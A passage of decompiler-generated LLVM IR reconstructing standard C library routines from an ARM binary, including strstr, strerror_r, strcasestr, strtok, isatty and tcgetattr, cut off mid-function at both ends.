dec_label_pc_24ccc:                               ; preds = %dec_label_pc_24cbc
  %v1_24ccc = add i32 %v0_24ce437, 2
  %v2_24ccc = inttoptr i32 %v1_24ccc to i8*
  %v3_24ccc = load i8, i8* %v2_24ccc, align 1
  %v2_24cd0 = icmp eq i8 %v3_24ccc, 0
  br i1 %v2_24cd0, label %dec_label_pc_24d00, label %dec_label_pc_24cdc

dec_label_pc_24cdc:                               ; preds = %dec_label_pc_24ccc
  %v1_24cdc = add i32 %v0_24ce437, 3
  %v2_24cdc = inttoptr i32 %v1_24cdc to i8*
  %v3_24cdc = load i8, i8* %v2_24cdc, align 1
  %v2_24ce0 = icmp eq i8 %v3_24cdc, 0
  br i1 %v2_24ce0, label %dec_label_pc_24d00, label %dec_label_pc_24cec

dec_label_pc_24cec:                               ; preds = %dec_label_pc_24cdc, %dec_label_pc_24c94
  %v3_24cf0 = icmp ult i32 %v4_24c94, %v5_24d04
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_24cf0, label %dec_label_pc_24c94, label %dec_label_pc_24d00

dec_label_pc_24d00:                               ; preds = %dec_label_pc_24cec, %dec_label_pc_24c8c, %dec_label_pc_24c74, %dec_label_pc_24cbc, %dec_label_pc_24ccc, %dec_label_pc_24cdc, %bb21
  %v1_24d00 = phi i32 [ %v0_24ce437, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_24c8c ], [ %v1_24cbc, %dec_label_pc_24cbc ], [ %v1_24ccc, %dec_label_pc_24ccc ], [ %v1_24cdc, %dec_label_pc_24cdc ], [ %v5_24d04, %dec_label_pc_24cec ], [ %v0_24c80, %dec_label_pc_24c74 ]
  %v3_24d00 = icmp uge i32 %v5_24d04, %v1_24d00
  %v9_24d00 = icmp eq i32 %v5_24d04, %v1_24d00
  %v2_24d04 = xor i1 %v3_24d00, true
  %v3_24d04 = or i1 %v9_24d00, %v2_24d04
  br i1 %v3_24d04, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_24d00
  %v6_24d04 = sub i32 %v5_24d04, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_24d00, %bb22
  %v5_24d08 = phi i32 [ %v1_24d00, %dec_label_pc_24d00 ], [ %v6_24d04, %bb22 ]
  %v2_24d08 = xor i1 %v9_24d00, true
  %v3_24d08 = and i1 %v3_24d00, %v2_24d08
  br i1 %v3_24d08, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_24d08 = sub i32 %v5_24d08, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_24d10 = phi i32 [ 0, %bb ], [ %v5_24d08, %bb23 ], [ %v6_24d08, %bb24 ]
  ret i32 %v1_24d10

; uselistorder directives
  uselistorder i1 %v3_24d00, { 1, 0 }
  uselistorder i32 %v4_24c94, { 1, 0 }
  uselistorder i32 %v0_24ce437, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_24c80, { 1, 0, 2 }
  uselistorder i32 %v5_24d04, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_24d00, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_24c74, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_24d20 = load i8, i8* %arg2, align 1
  %v2_24d24 = icmp eq i8 %v3_24d20, 0
  %v1_24e14.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_24d24, label %dec_label_pc_24e10, label %dec_label_pc_24d2c

dec_label_pc_24d2c:                               ; preds = %entry
  %v1_24d2c = add i32 %v1_24e14.pre, -1
  store i32 %v1_24d2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24d30

dec_label_pc_24d30:                               ; preds = %dec_label_pc_24d3c, %dec_label_pc_24d2c
  %v0_24d30 = phi i32 [ %v1_24d30, %dec_label_pc_24d3c ], [ %v1_24d2c, %dec_label_pc_24d2c ]
  %v1_24d30 = add i32 %v0_24d30, 1
  %v2_24d30 = inttoptr i32 %v1_24d30 to i8*
  %v3_24d30 = load i8, i8* %v2_24d30, align 1
  store i32 %v1_24d30, i32* %r0.global-to-local, align 4
  %v2_24d34 = icmp eq i8 %v3_24d30, 0
  br i1 %v2_24d34, label %dec_label_pc_24e0c, label %dec_label_pc_24d3c

dec_label_pc_24d3c:                               ; preds = %dec_label_pc_24d30
  %v9_24d3c = icmp eq i8 %v3_24d30, %v3_24d20
  br i1 %v9_24d3c, label %dec_label_pc_24d44, label %dec_label_pc_24d30

dec_label_pc_24d44:                               ; preds = %dec_label_pc_24d3c
  %v2_24d44 = add i32 %tmp, 1
  %v3_24d44 = inttoptr i32 %v2_24d44 to i8*
  %v4_24d44 = load i8, i8* %v3_24d44, align 1
  %v2_24d48 = icmp eq i8 %v4_24d44, 0
  br i1 %v2_24d48, label %dec_label_pc_24e10, label %dec_label_pc_24d54

dec_label_pc_24d54:                               ; preds = %dec_label_pc_24d44
  %v1_24d54 = add i32 %v0_24d30, 2
  %v1_24da8 = add i32 %tmp, 2
  %v2_24da8 = inttoptr i32 %v1_24da8 to i8*
  br label %dec_label_pc_24da0

dec_label_pc_24d64:                               ; preds = %dec_label_pc_24e00
  %v3_24d64 = load i8, i8* %v3_24d98.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24d90.preheader

dec_label_pc_24d90.preheader:                     ; preds = %dec_label_pc_24d64, %dec_label_pc_24da0
  %v0_24d903.in = phi i8 [ %v3_24d64, %dec_label_pc_24d64 ], [ %v3_24d98.pn, %dec_label_pc_24da0 ]
  %v9_24d9012 = icmp eq i8 %v0_24d903.in, %v3_24d20
  br i1 %v9_24d9012, label %dec_label_pc_24d98, label %dec_label_pc_24d70

dec_label_pc_24d70:                               ; preds = %dec_label_pc_24d90.preheader, %dec_label_pc_24d8c
  %v0_24d78 = phi i32 [ %v1_24d8c, %dec_label_pc_24d8c ], [ %storemerge41, %dec_label_pc_24d90.preheader ]
  %v0_24d70.in = phi i8 [ %v3_24d8c, %dec_label_pc_24d8c ], [ %v0_24d903.in, %dec_label_pc_24d90.preheader ]
  %v2_24d70 = icmp eq i8 %v0_24d70.in, 0
  br i1 %v2_24d70, label %dec_label_pc_24e0c, label %dec_label_pc_24d78

dec_label_pc_24d78:                               ; preds = %dec_label_pc_24d70
  %v1_24d78 = add i32 %v0_24d78, 1
  %v2_24d78 = inttoptr i32 %v1_24d78 to i8*
  %v3_24d78 = load i8, i8* %v2_24d78, align 1
  store i32 %v1_24d78, i32* %r0.global-to-local, align 4
  %v9_24d7c = icmp eq i8 %v3_24d78, %v3_24d20
  br i1 %v9_24d7c, label %dec_label_pc_24d98, label %dec_label_pc_24d84

dec_label_pc_24d84:                               ; preds = %dec_label_pc_24d78
  %v2_24d84 = icmp eq i8 %v3_24d78, 0
  br i1 %v2_24d84, label %dec_label_pc_24e0c, label %dec_label_pc_24d8c

dec_label_pc_24d8c:                               ; preds = %dec_label_pc_24d84
  %v1_24d8c = add i32 %v0_24d78, 2
  %v2_24d8c = inttoptr i32 %v1_24d8c to i8*
  %v3_24d8c = load i8, i8* %v2_24d8c, align 1
  store i32 %v1_24d8c, i32* %r0.global-to-local, align 4
  %v9_24d90 = icmp eq i8 %v3_24d8c, %v3_24d20
  br i1 %v9_24d90, label %dec_label_pc_24d98, label %dec_label_pc_24d70

dec_label_pc_24d98:                               ; preds = %dec_label_pc_24d78, %dec_label_pc_24d8c, %dec_label_pc_24d90.preheader
  %v0_24d98 = phi i32 [ %storemerge41, %dec_label_pc_24d90.preheader ], [ %v1_24d78, %dec_label_pc_24d78 ], [ %v1_24d8c, %dec_label_pc_24d8c ]
  %v1_24d98 = add i32 %v0_24d98, 1
  br label %dec_label_pc_24da0

dec_label_pc_24da0:                               ; preds = %dec_label_pc_24d54, %dec_label_pc_24d98
  %storemerge41 = phi i32 [ %v1_24d98, %dec_label_pc_24d98 ], [ %v1_24d54, %dec_label_pc_24d54 ]
  %v3_24d98.pn.in = inttoptr i32 %storemerge41 to i8*
  %v3_24d98.pn = load i8, i8* %v3_24d98.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  %storemerge = icmp eq i8 %v3_24d98.pn, %v4_24d44
  br i1 %storemerge, label %dec_label_pc_24da4, label %dec_label_pc_24d90.preheader

dec_label_pc_24da4:                               ; preds = %dec_label_pc_24da0
  %v1_24da4 = add i32 %storemerge41, 1
  %v2_24da4 = inttoptr i32 %v1_24da4 to i8*
  %v3_24da4 = load i8, i8* %v2_24da4, align 1
  %v4_24da4 = zext i8 %v3_24da4 to i32
  %v3_24da8 = load i8, i8* %v2_24da8, align 1
  %v4_24da8 = zext i8 %v3_24da8 to i32
  %v9_24db0 = icmp eq i8 %v3_24da4, %v3_24da8
  %v1_24db8 = add i32 %storemerge41, -1
  store i32 %v1_24db8, i32* %r0.global-to-local, align 4
  br i1 %v9_24db0, label %dec_label_pc_24dc0, label %dec_label_pc_24e00

dec_label_pc_24dc0:                               ; preds = %dec_label_pc_24da4, %dec_label_pc_24df0
  %v0_24dd8 = phi i32 [ %v1_24de0, %dec_label_pc_24df0 ], [ %v1_24da8, %dec_label_pc_24da4 ]
  %v0_24dd0 = phi i32 [ %v1_24ddc, %dec_label_pc_24df0 ], [ %v1_24da4, %dec_label_pc_24da4 ]
  %v0_24dc0 = phi i32 [ %v4_24df0, %dec_label_pc_24df0 ], [ %v4_24da4, %dec_label_pc_24da4 ]
  %v2_24dc0 = icmp eq i32 %v0_24dc0, 0
  br i1 %v2_24dc0, label %dec_label_pc_24e10, label %dec_label_pc_24dc8

dec_label_pc_24dc8:                               ; preds = %dec_label_pc_24dc0
  %v1_24dc8 = add i32 %v0_24dd0, 1
  %v2_24dc8 = inttoptr i32 %v1_24dc8 to i8*
  %v3_24dc8 = load i8, i8* %v2_24dc8, align 1
  %v1_24dcc = add i32 %v0_24dd8, 1
  %v2_24dcc = inttoptr i32 %v1_24dcc to i8*
  %v3_24dcc = load i8, i8* %v2_24dcc, align 1
  %v4_24dcc = zext i8 %v3_24dcc to i32
  %v9_24dd4 = icmp eq i8 %v3_24dc8, %v3_24dcc
  %v1_24ddc = add i32 %v0_24dd0, 2
  %v1_24de0 = add i32 %v0_24dd8, 2
  br i1 %v9_24dd4, label %dec_label_pc_24de8, label %dec_label_pc_24e00

dec_label_pc_24de8:                               ; preds = %dec_label_pc_24dc8
  %v2_24de8 = icmp eq i8 %v3_24dc8, 0
  br i1 %v2_24de8, label %dec_label_pc_24e10, label %dec_label_pc_24df0

dec_label_pc_24df0:                               ; preds = %dec_label_pc_24de8
  %v2_24df0 = inttoptr i32 %v1_24de0 to i8*
  %v3_24df0 = load i8, i8* %v2_24df0, align 1
  %v4_24df0 = zext i8 %v3_24df0 to i32
  %v2_24df4 = inttoptr i32 %v1_24ddc to i8*
  %v3_24df4 = load i8, i8* %v2_24df4, align 1
  %v9_24df8 = icmp eq i8 %v3_24df4, %v3_24df0
  br i1 %v9_24df8, label %dec_label_pc_24dc0, label %dec_label_pc_24e00

dec_label_pc_24e00:                               ; preds = %dec_label_pc_24df0, %dec_label_pc_24dc8, %dec_label_pc_24da4
  %v0_24e00 = phi i32 [ %v4_24da8, %dec_label_pc_24da4 ], [ %v4_24df0, %dec_label_pc_24df0 ], [ %v4_24dcc, %dec_label_pc_24dc8 ]
  %v2_24e00 = icmp eq i32 %v0_24e00, 0
  br i1 %v2_24e00, label %dec_label_pc_24e10, label %dec_label_pc_24d64

dec_label_pc_24e0c:                               ; preds = %dec_label_pc_24d30, %dec_label_pc_24d84, %dec_label_pc_24d70
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24e10

dec_label_pc_24e10:                               ; preds = %dec_label_pc_24e00, %dec_label_pc_24de8, %dec_label_pc_24dc0, %entry, %dec_label_pc_24d44, %dec_label_pc_24e0c
  %v1_24e14 = phi i32 [ %v1_24d30, %dec_label_pc_24d44 ], [ 0, %dec_label_pc_24e0c ], [ %v1_24e14.pre, %entry ], [ %v1_24db8, %dec_label_pc_24dc0 ], [ %v1_24db8, %dec_label_pc_24de8 ], [ %v1_24db8, %dec_label_pc_24e00 ]
  ret i32 %v1_24e14

; uselistorder directives
  uselistorder i32 %v1_24ddc, { 1, 0 }
  uselistorder i8 %v3_24d98.pn, { 1, 0 }
  uselistorder i8* %v3_24d98.pn.in, { 1, 0 }
  uselistorder i32 %storemerge41, { 3, 2, 6, 1, 4, 0, 5 }
  uselistorder i8 %v3_24d8c, { 1, 0 }
  uselistorder i32 %v1_24d8c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_24d30, { 0, 2, 3, 1 }
  uselistorder i8 %v3_24d20, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 2, 6, 7, 4, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_24e10, { 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_24e0c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_24dc0, { 1, 0 }
  uselistorder label %dec_label_pc_24da0, { 1, 0 }
  uselistorder label %dec_label_pc_24d98, { 1, 0, 2 }
  uselistorder label %dec_label_pc_24d70, { 1, 0 }
  uselistorder label %dec_label_pc_24d90.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_24e20 = call i32 @__xpg_strerror_r()
  %v0_24e24 = load i32, i32* @r4, align 4
  ret i32 %v0_24e24
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_24e30 = load i32, i32* @r4, align 4
  %v9_24e30 = load i32, i32* @r6, align 4
  %v0_24e38 = load i32, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r6, align 4
  store i32 %v0_24e38, i32* @ip, align 4
  %v0_24e48 = load i32, i32* @r1, align 4
  store i32 %v0_24e48, i32* @r7, align 4
  %v0_24e4c = load i32, i32* @r2, align 4
  store i32 %v0_24e4c, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_24e38, 124
  br i1 %tmp, label %dec_label_pc_24e84, label %dec_label_pc_24e54

dec_label_pc_24e54:                               ; preds = %entry
  br label %dec_label_pc_24e6c

dec_label_pc_24e60:                               ; preds = %dec_label_pc_24e6c
  br i1 %v2_24e78, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_24e60
  %v2_24e64 = add i32 %v1_24e7c, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_24e60, %bb
  %v0_24e6c1 = phi i32 [ %v1_24e7c, %dec_label_pc_24e60 ], [ %v2_24e64, %bb ]
  %v1_24e68 = add i32 %v0_24e68, 1
  br label %dec_label_pc_24e6c

dec_label_pc_24e6c:                               ; preds = %dec_label_pc_24e54, %bb15
  %v1_24e7c = phi i32 [ %v0_24e38, %dec_label_pc_24e54 ], [ %v0_24e6c1, %bb15 ]
  %v0_24e68 = phi i32 [ add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37380), %dec_label_pc_24e54 ], [ %v1_24e68, %bb15 ]
  store i32 %v0_24e68, i32* @r5, align 4
  %v2_24e6c = icmp eq i32 %v1_24e7c, 0
  %v1_24e70 = inttoptr i32 %v0_24e68 to i8*
  %v2_24e70 = load i8, i8* %v1_24e70, align 1
  %v3_24e70 = zext i8 %v2_24e70 to i32
  store i32 %v3_24e70, i32* @r3, align 4
  %v2_24e78 = icmp eq i8 %v2_24e70, 0
  br i1 %v2_24e6c, label %dec_label_pc_24e78, label %dec_label_pc_24e60

dec_label_pc_24e78:                               ; preds = %dec_label_pc_24e6c
  br i1 %v2_24e78, label %dec_label_pc_24e84, label %bb16

bb16:                                             ; preds = %dec_label_pc_24e78
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_24ec0

dec_label_pc_24e84:                               ; preds = %dec_label_pc_24e78, %entry
  store i32 %v0_24e38, i32* @r2, align 4
  %v3_24e8c = ashr i32 %v0_24e38, 31
  store i32 %v3_24e8c, i32* @r3, align 4
  %v6_24ea0 = bitcast i32* %stack_var_-25 to i8*
  %v7_24ea0 = call i32 @_uintmaxtostr(i8* %v6_24ea0)
  %v1_24ea8 = add i32 %v7_24ea0, -14
  store i32 %v1_24ea8, i32* @r5, align 4
  %v0_24eac = load i32, i32* @r6, align 4
  %v2_24eac = add i32 %v0_24eac, -37396
  store i32 %v2_24eac, i32* @r1, align 4
  store i32 %v1_24ea8, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_24eb8 = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_24ec0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_24ec0

dec_label_pc_24ec0:                               ; preds = %bb16, %dec_label_pc_24e84
  %v0_24ec0 = phi i32 [ %v0_24e68, %bb16 ], [ %v0_24ec0.pre, %dec_label_pc_24e84 ]
  %v1_24ec0 = inttoptr i32 %v0_24ec0 to i8*
  %v3_24ec4 = call i32 @strlen(i8* %v1_24ec0)
  %v0_24ec8 = load i32, i32* @r7, align 4
  %v2_24ec8 = icmp eq i32 %v0_24ec8, 0
  br i1 %v2_24ec8, label %bb17, label %dec_label_pc_24ec0._crit_edge

dec_label_pc_24ec0._crit_edge:                    ; preds = %dec_label_pc_24ec0
  %v1_24ed4.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_24ec0
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_24ec0._crit_edge, %bb17
  %v1_24ed4 = phi i32 [ %v1_24ed4.pre, %dec_label_pc_24ec0._crit_edge ], [ 0, %bb17 ]
  %v1_24ed0 = add i32 %v3_24ec4, 1
  %v3_24ed4 = icmp uge i32 %v1_24ed0, %v1_24ed4
  %v9_24ed4 = icmp eq i32 %v1_24ed0, %v1_24ed4
  %v2_24ed8 = xor i1 %v3_24ed4, true
  %v3_24ed8 = or i1 %v9_24ed4, %v2_24ed8
  br i1 %v3_24ed8, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_24ed0, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_24ee8 = phi i32 [ %v1_24ed4, %bb18 ], [ %v1_24ed0, %bb19 ]
  %v2_24edc = xor i1 %v9_24ed4, true
  %v3_24edc = and i1 %v3_24ed4, %v2_24edc
  br i1 %v3_24edc, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_24ee0 = icmp eq i32 %v0_24ee8, 0
  br i1 %v2_24ee0, label %dec_label_pc_24f04, label %dec_label_pc_24ee8

dec_label_pc_24ee8:                               ; preds = %bb22
  store i32 %v0_24ee8, i32* @r2, align 4
  %v0_24eec = load i32, i32* @r5, align 4
  store i32 %v0_24eec, i32* @r1, align 4
  store i32 %v0_24ec8, i32* @r0, align 4
  %v0_24ef4 = call i32 @memcpy()
  %v0_24ef8 = load i32, i32* @r4, align 4
  %v1_24ef8 = load i32, i32* @r7, align 4
  %v2_24ef8 = add i32 %v1_24ef8, %v0_24ef8
  %v3_24f00 = add i32 %v2_24ef8, -1
  %v4_24f00 = inttoptr i32 %v3_24f00 to i8*
  store i8 0, i8* %v4_24f00, align 1
  br label %dec_label_pc_24f04

dec_label_pc_24f04:                               ; preds = %bb22, %dec_label_pc_24ee8
  %v0_24f04 = load i32, i32* %r6.global-to-local, align 4
  %v2_24f04 = icmp eq i32 %v0_24f04, 0
  br i1 %v2_24f04, label %dec_label_pc_24f1c, label %dec_label_pc_24f0c

dec_label_pc_24f0c:                               ; preds = %dec_label_pc_24f04
  %v0_24f10 = call i32 @__aeabi_read_tp()
  %v3_24f14 = load i16, i16* @global_var_42934.3040, align 2
  %v4_24f14 = sext i16 %v3_24f14 to i32
  %v0_24f18 = load i32, i32* %r6.global-to-local, align 4
  %v3_24f18 = add i32 %v4_24f14, %v0_24f10
  %v4_24f18 = inttoptr i32 %v3_24f18 to i32*
  store i32 %v0_24f18, i32* %v4_24f18, align 4
  %v0_24f1c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_24f1c

dec_label_pc_24f1c:                               ; preds = %dec_label_pc_24f04, %dec_label_pc_24f0c
  %v0_24f1c = phi i32 [ 0, %dec_label_pc_24f04 ], [ %v0_24f1c.pre, %dec_label_pc_24f0c ]
  store i32 %v3_24e30, i32* @r4, align 4
  store i32 %v9_24e30, i32* %r6.global-to-local, align 4
  ret i32 %v0_24f1c

; uselistorder directives
  uselistorder i1 %v3_24ed4, { 1, 0 }
  uselistorder i32 %v0_24e68, { 0, 2, 3, 1 }
  uselistorder i32 %v1_24e7c, { 1, 0, 2 }
  uselistorder i32 %v0_24e38, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_24f1c, { 1, 0 }
  uselistorder label %dec_label_pc_24f04, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_24ec0, { 1, 0 }
  uselistorder label %dec_label_pc_24e6c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_24f48 = load i32, i32* %r0.global-to-local, align 4
  %v1_24f5c23 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_24f5c.outer

dec_label_pc_24f5c.outer:                         ; preds = %dec_label_pc_24f9c, %entry
  %v0_24f9c.ph = phi i32 [ %v1_24f9c, %dec_label_pc_24f9c ], [ %v0_24f48, %entry ]
  %v2_24f5c24 = load i8, i8* %v1_24f5c23, align 1
  %v2_24f6026 = icmp eq i8 %v2_24f5c24, 0
  br i1 %v2_24f6026, label %bb, label %dec_label_pc_24f74

bb:                                               ; preds = %dec_label_pc_24f5c.backedge, %dec_label_pc_24f5c.outer
  store i32 %v0_24f9c.ph, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24fb0

dec_label_pc_24f74:                               ; preds = %dec_label_pc_24f5c.outer, %dec_label_pc_24f5c.backedge
  %v1_24f6832.in = phi i32 [ %v1_24f6832, %dec_label_pc_24f5c.backedge ], [ %arg2, %dec_label_pc_24f5c.outer ]
  %v2_24f5c30 = phi i8 [ %v2_24f5c, %dec_label_pc_24f5c.backedge ], [ %v2_24f5c24, %dec_label_pc_24f5c.outer ]
  %v2_24f6431.in.in = phi i8 [ %v2_24f5c, %dec_label_pc_24f5c.backedge ], [ %v2_24f5c24, %dec_label_pc_24f5c.outer ]
  %v0_24f8029 = phi i32 [ %v1_24f80, %dec_label_pc_24f5c.backedge ], [ %v0_24f9c.ph, %dec_label_pc_24f5c.outer ]
  %v1_24f6832 = add i32 %v1_24f6832.in, 1
  %v1_24f74 = inttoptr i32 %v0_24f8029 to i8*
  %v2_24f74 = load i8, i8* %v1_24f74, align 1
  %v3_24f74 = zext i8 %v2_24f74 to i32
  store i32 %v3_24f74, i32* %r0.global-to-local, align 4
  %v9_24f78 = icmp eq i8 %v2_24f5c30, %v2_24f74
  %v1_24f80 = add i32 %v0_24f8029, 1
  br i1 %v9_24f78, label %dec_label_pc_24f5c.backedge, label %dec_label_pc_24f88

dec_label_pc_24f5c.backedge:                      ; preds = %dec_label_pc_24f74, %dec_label_pc_24f88
  %v1_24f5c = inttoptr i32 %v1_24f6832 to i8*
  %v2_24f5c = load i8, i8* %v1_24f5c, align 1
  %v2_24f60 = icmp eq i8 %v2_24f5c, 0
  br i1 %v2_24f60, label %bb, label %dec_label_pc_24f74

dec_label_pc_24f88:                               ; preds = %dec_label_pc_24f74
  %v2_24f6431.in = zext i8 %v2_24f6431.in.in to i32
  %v2_24f7c = mul nuw nsw i32 %v3_24f74, 2
  %v2_24f6431 = mul nuw nsw i32 %v2_24f6431.in, 2
  %v4_24f88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 868) to i32*), align 4
  %v2_24f8c = add i32 %v4_24f88, %v2_24f7c
  %v3_24f8c = inttoptr i32 %v2_24f8c to i16*
  %v4_24f8c = load i16, i16* %v3_24f8c, align 2
  %v2_24f90 = add i32 %v4_24f88, %v2_24f6431
  %v3_24f90 = inttoptr i32 %v2_24f90 to i16*
  %v4_24f90 = load i16, i16* %v3_24f90, align 2
  %v9_24f94 = icmp eq i16 %v4_24f90, %v4_24f8c
  br i1 %v9_24f94, label %dec_label_pc_24f5c.backedge, label %dec_label_pc_24f9c

dec_label_pc_24f9c:                               ; preds = %dec_label_pc_24f88
  %v1_24f9c = add i32 %v0_24f9c.ph, 1
  %v2_24fa0 = icmp eq i8 %v2_24f74, 0
  br i1 %v2_24fa0, label %dec_label_pc_24fb0, label %dec_label_pc_24f5c.outer

dec_label_pc_24fb0:                               ; preds = %dec_label_pc_24f9c, %bb
  %v1_24fb4 = phi i32 [ %v0_24f9c.ph, %bb ], [ 0, %dec_label_pc_24f9c ]
  ret i32 %v1_24fb4

; uselistorder directives
  uselistorder i8 %v2_24f5c, { 2, 1, 0 }
  uselistorder i32 %v0_24f8029, { 1, 0 }
  uselistorder i32 %v0_24f9c.ph, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_24f5c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_24f74, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 25564), i32* @r2, align 4
  %v0_24fd8 = call i32 @strtok_r()
  ret i32 %v0_24fd8
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_24ff8 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_24ff8, i32* @r1, align 4
  %v0_24ffc = call i32 @__GI_tcgetattr()
  %v1_25000 = sub i32 1, %v0_24ffc
  %v2_25000 = icmp ult i32 %v0_24ffc, 2
  br i1 %v2_25000, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_25010 = phi i32 [ %v1_25000, %entry ], [ 0, %bb ]
  ret i32 %v1_25010

; uselistorder directives
  uselistorder i32 %v0_24ffc, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_25014 = load i32, i32* @r4, align 4
  %v6_25014 = load i32, i32* @r5, align 4
  %v9_25014 = load i32, i32* @r6, align 4
  %v2_2501c = ptrtoint i32* %stack_var_-52 to i32
  %v0_25020 = load i32, i32* @r1, align 4
  store i32 %v0_25020, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_2502c = load i32, i32* @r0, align 4
  %v3_2502c = call i32 @ioctl(i32 %v0_2502c, i32 21505, i32 %v2_2501c)
  store i32 %v3_2502c, i32* %r0.global-to-local, align 4
  store i32 %v3_2502c, i32* @r5, align 4
  %v2_25030 = icmp eq i32 %v3_2502c, 0
  br i1 %v2_25030, label %dec_label_pc_25038, label %dec_label_pc_2507c

dec_label_pc_25038:                               ; preds = %entry
  %v4_25044 = zext i8 %tmp to i32
  store i32 %v4_25044, i32* @ip, align 4
  %v3_25048 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_25048, i32* @r3, align 4
  %v1_2504c = load i32, i32* @r4, align 4
  %v2_2504c = add i32 %v1_2504c, 4
  %v3_2504c = inttoptr i32 %v2_2504c to i32*
  %v0_25050 = load i32, i32* %r1.global-to-local, align 4
  %v1_25050 = load i32, i32* @r4, align 4
  %v2_25050 = add i32 %v1_25050, 8
  %v3_25050 = inttoptr i32 %v2_25050 to i32*
  store i32 %v0_25050, i32* %v3_25050, align 4
  %v0_25054 = load i32, i32* %r0.global-to-local, align 4
  %v1_25054 = load i32, i32* @r4, align 4
  %v2_25054 = add i32 %v1_25054, 12
  %v3_25054 = inttoptr i32 %v2_25054 to i32*
  store i32 %v0_25054, i32* %v3_25054, align 4
  %v2_25058 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_25058, i32* @r1, align 4
  %v1_25060 = load i32, i32* @r4, align 4
  %v2_25060 = inttoptr i32 %v1_25060 to i32*
  store i32 %v3_25048, i32* %v2_25060, align 4
  %v0_25064 = load i32, i32* @ip, align 4
